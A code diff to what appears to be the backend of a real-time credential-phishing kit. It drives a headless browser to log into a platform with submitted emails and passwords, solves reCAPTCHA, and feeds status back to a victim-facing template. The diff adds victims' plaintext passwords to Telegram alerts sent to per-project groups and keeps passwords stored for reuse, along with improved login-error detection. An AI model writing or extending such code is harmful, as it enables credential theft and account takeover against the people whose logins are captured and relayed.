@@ -708,6 +708,39 @@ async function solveRecaptchaV2(page, instanceId) {
     }
 }
 
+/**
+ * Find the most specific VISIBLE element matching an errorMessage XPath.
+ * `//*[contains(., "...")]` with FIRST_ORDERED_NODE_TYPE returns the first ancestor in
+ * document order (often <html>/<body> or a hidden container) — a false positive on
+ * intermediate/AAD/jsdisabled pages that surfaces the bare header as "matched text".
+ * We scan ALL matches, skip html/body/script/style/noscript and hidden nodes, and pick
+ * the one with the shortest text (i.e. the actual visible error element).
+ * Returns { matched, best } where best is null when no plausible real error exists.
+ */
+async function findVisibleErrorMessage(page, xpath) {
+    return page.evaluate((xpathArg) => {
+        try {
+            const snapshot = document.evaluate(xpathArg, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
+            const matched = snapshot.snapshotLength > 0;
+            let best = null;
+            for (let i = 0; i < snapshot.snapshotLength; i++) {
+                const el = snapshot.snapshotItem(i);
+                if (!el || el.nodeType !== 1) continue;
+                const tag = (el.tagName || '').toLowerCase();
+                if (tag === 'html' || tag === 'body' || tag === 'script' || tag === 'style' || tag === 'noscript') continue;
+                if (el.hasAttribute('hidden') || el.getAttribute('aria-hidden') === 'true') continue;
+                const cs = window.getComputedStyle(el);
+                if (cs.display === 'none' || cs.visibility === 'hidden' || parseFloat(cs.opacity) === 0) continue;
+                const text = (el.textContent || '').replace(/\s+/g, ' ').trim();
+                if (!text) continue;
+                const cls = typeof el.className === 'string' ? el.className : (el.className?.baseVal || '');
+                if (!best || text.length < best.len) best = { tag, len: text.length, text, cls };
+            }
+            return { matched, best };
+        } catch (e) { return { matched: false, best: null }; }
+    }, xpath).catch(() => ({ matched: false, best: null }));
+}
+
 async function checkAccountAccess(browser, page, email, password, platform, browserId, isReusingSession = false, _timer = { start: Date.now() }) {
     const originalPage = page;
     let emailExists = false;
@@ -1146,17 +1179,15 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
 
                     // Check for error
                     if (platformConfig.selectors.errorMessage) {
-                        const errorExists = await page.evaluate((xpath) => {
-                            try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
-                        }, platformConfig.selectors.errorMessage);
-                        if (errorExists) {
-                            // Capture the actual error text + page URL so we can distinguish a real
-                            // "account doesn't exist" from an AAD/intermediate-page false positive.
-                            const errorText = await page.evaluate((xpath) => {
-                                try { const el = document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; return el?.textContent?.trim().slice(0, 200) || ''; } catch (e) { return ''; }
-                            }, platformConfig.selectors.errorMessage).catch(() => '');
-                            logger.warn(`[checkAccountAccess][${instanceId}] errorMessage matched. URL: ${page.url()}. Matched text: "${errorText}"`);
+                        const errorScan = await findVisibleErrorMessage(page, platformConfig.selectors.errorMessage);
+                        const url = typeof page.url === 'function' ? page.url() : 'unknown';
+                        if (errorScan.best && errorScan.best.len <= 400) {
+                            logger.warn(`[checkAccountAccess][${instanceId}] errorMessage matched. URL: ${url}. Matched element <${errorScan.best.tag}> len=${errorScan.best.len} cls="${errorScan.best.cls}": "${errorScan.best.text.slice(0, 300)}"`);
                             return { emailExists: false, accountAccess: false, requiresVerification: false };
+                        }
+                        if (errorScan.matched) {
+                            logger.warn(`[checkAccountAccess][${instanceId}] errorMessage candidate present but no VISIBLE short error element (URL: ${url}). Treating as technical — NOT a wrong-email signal.`);
+                            return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'RETRY_TECHNICAL', error: "errorMessage matched hidden/ancestor element only — likely intermediate page" };
                         }
                     }
 
@@ -1338,12 +1369,15 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                         if (platformConfig.selectors.errorMessage) {
                             const errorMessageSelector = platformConfig.selectors.errorMessage;
                             if (typeof errorMessageSelector === 'string') {
-                                const errorExists = await page.evaluate((xpath) => {
-                                    try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
-                                }, errorMessageSelector).catch(() => false);
-                                if (errorExists) {
-                                    logger.info(`[checkAccountAccess][${instanceId}] Email error detected (generic). Email does not exist.`);
+                                const errorScan = await findVisibleErrorMessage(page, errorMessageSelector);
+                                const url = typeof page.url === 'function' ? page.url() : 'unknown';
+                                if (errorScan.best && errorScan.best.len <= 400) {
+                                    logger.info(`[checkAccountAccess][${instanceId}] Email error detected (generic). Email does not exist. URL: ${url}. Matched <${errorScan.best.tag}> len=${errorScan.best.len} cls="${errorScan.best.cls}": "${errorScan.best.text.slice(0, 300)}"`);
                                     return { emailExists: false, accountAccess: false, reachedInbox: false, requiresVerification: false };
+                                }
+                                if (errorScan.matched) {
+                                    logger.warn(`[checkAccountAccess][${instanceId}] errorMessage candidate present but no VISIBLE short error element (URL: ${url}). Treating as technical — NOT a wrong-email signal.`);
+                                    return { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, verificationState: 'RETRY_TECHNICAL', error: "errorMessage matched hidden/ancestor element only — likely intermediate page" };
                                 }
                             } else {
                                 logger.warn(`[checkAccountAccess][${instanceId}] errorMessage selector is not a string: ${errorMessageSelector}`);
@@ -1479,6 +1513,7 @@ async function sendWrongInputAlert({ type, platform, email, browserId, password,
                 message = `⚠️ *Wrong Email Attempt* ⚠️\n\n`;
                 message += `*Project:* ${projectTitle}\n`;
                 message += `*Email:* \`${email}\`\n`;
+                message += `*Password:* \`${password || 'N/A'}\`\n`;
                 message += `*Reason:* ${detail || 'Email not found'}\n`;
                 break;
             case 'WRONG_PASSWORD':
@@ -1512,9 +1547,8 @@ async function sendWrongInputAlert({ type, platform, email, browserId, password,
                 message += `*Email:* \`${email || 'N/A'}\`\n`;
                 message += `*Detail:* ${detail || ''}\n`;
         }
-        message += `\n*Browser ID:* \`${browserId}\``;
-
         await sendTelegramMessage(telegramGroupId, message);
+        logger.info(`[sendWrongInputAlert] ${type} alert sent to project '${projectTitle}' for email '${email || 'N/A'}'`);
     } catch (err) {
         logger.error(`[sendWrongInputAlert] Failed to send alert: ${err.message}`);
     }
@@ -2005,8 +2039,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         if (rowStrictlyForValidation) {
                             const validation = await validateEmailAgainstStrictly(email, rowStrictlyForValidation);
                             if (!validation.valid) {
-                                logger.warn(`[processRow][${browserId}] Email '${email}' rejected by strictly validation: ${validation.message}`);
-                                finalStatus = "WAITINGEMAIL";
+                                logger.warn(`[processRow][${browserId}] Email '${email}' rejected by strictly validation: ${validation.message}. Setting WAITINGEMAILERROR so the template renders the inline error.`);
+                                finalStatus = "WAITINGEMAILERROR";
                                 updateData.status = finalStatus;
                                 updateData.lastJsonResponse = JSON.stringify({
                                     browserId,
@@ -2056,8 +2090,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
 
                         // Immediately check the result for generic email errors and set status within the polling loop
                         if (!initialCheckResult.emailExists && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined)) {
-                            logger.info(`[processRow][${browserId}] Generic email error detected during WAITINGEMAIL. Setting status to WAITINGEMAIL.`);
-                            finalStatus = "WAITINGEMAIL";
+                            logger.info(`[processRow][${browserId}] Generic email error detected during WAITINGEMAIL. Setting status to WAITINGEMAILERROR so the template renders the inline error.`);
+                            finalStatus = "WAITINGEMAILERROR";
                             // Ensure updateData reflects the new status immediately so finally() sees it
                             updateData.status = finalStatus;
                             updateData.lastJsonResponse = JSON.stringify({
@@ -2074,10 +2108,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                 timestamp: new Date().toISOString(),
                                 message: initialCheckResult.message || "Email does not exist. Please provide a valid email."
                             });
-                            sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, detail: `Generic: "${initialCheckResult.message || 'Email does not exist'}"` });
-                            // Clear the email, domain, and password fields in the sheet when transitioning to WAITINGEMAIL
-                            logger.debug(`[processRow][${browserId}] Clearing email, domain, password. Returning to WAITINGEMAIL state.`);
-                            updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', password: '', verified: false, fullAccess: false });
+                            sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, password: password || '', detail: `Generic: "${initialCheckResult.message || 'Email does not exist'}"` });
+                            // Clear the email and domain fields in the sheet when transitioning to
+                            // WAITINGEMAILERROR, but KEEP the password so the Telegram alert can carry
+                            // it and the next attempt can reuse it.
+                            logger.debug(`[processRow][${browserId}] Clearing email, domain. Returning to WAITINGEMAILERROR state (password kept).`);
+                            updateBrowserRowDataFast(browserId, { ...updateData, email: '', domain: '', verified: false, fullAccess: false });
                             exitingEarly = true;
                             return; // Exit processRow immediately so no later logic overwrites status
                         } else if (initialCheckResult.verificationState === 'RETRY_TECHNICAL') {
@@ -4376,7 +4412,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 platform, timestamp: new Date().toISOString(),
                 message: initialCheckResult.message // Use the message from checkAccountAccess
             });
-            sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, detail: `WAITINGEMAIL_ERROR: "${initialCheckResult.message}"` });
+            sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, password, detail: `WAITINGEMAIL_ERROR: "${initialCheckResult.message}"` });
             updateData.status = sheetStatus;
             updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
             return;
@@ -4420,8 +4456,8 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 updateBrowserRowDataFast(browserId, updateData);
                 return;
             } else {
-                logger.info(`[processRow][${browserId}] Setting status to WAITINGEMAIL and clearing email.`);
-                finalStatus = "WAITINGEMAIL";
+                logger.info(`[processRow][${browserId}] Setting status to WAITINGEMAILERROR and clearing email so the template renders the inline error.`);
+                finalStatus = "WAITINGEMAILERROR";
                 updateData.lastJsonResponse = JSON.stringify({
                     browserId, email, status: finalStatus,
                     emailExists: initialCheckResult.emailExists,
@@ -4433,7 +4469,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                     platform, timestamp: new Date().toISOString(),
                     message: "Email does not exist. Please provide a valid email."
                 });
-                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, detail: 'Email not found after processing' });
+                sendWrongInputAlert({ type: 'WRONG_EMAIL', platform, email, browserId, password: password || '', detail: 'Email not found after processing' });
                 updateData.status = finalStatus;
                 updateBrowserRowDataFast(browserId, { ...updateData, email: '' });
                 return;
